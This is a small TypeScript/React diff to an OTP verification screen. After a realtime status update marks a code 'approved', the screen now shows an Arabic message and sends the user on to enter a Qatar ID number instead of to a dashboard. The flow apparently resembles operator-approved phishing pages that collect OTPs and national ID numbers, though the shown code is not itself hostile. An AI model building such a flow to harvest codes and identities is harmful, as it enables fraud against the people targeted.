@@ -129,8 +129,8 @@ const VerifyOtp = () => {
       }, (payload) => {
         const row = payload.new as { status: string };
         if (row.status === "approved") {
-          toast.success("تمت الموافقة! جاري تسجيل الدخول...");
-          navigate("/dashboard");
+          toast.success("تم التحقق! أدخل رقم الهوية...");
+          navigate("/verify-qatar-id", { state: { phone } });
         } else if (row.status === "rejected") {
           toast.error("المعلومات المدخلة غير صحيحة");
           setWaiting(false);
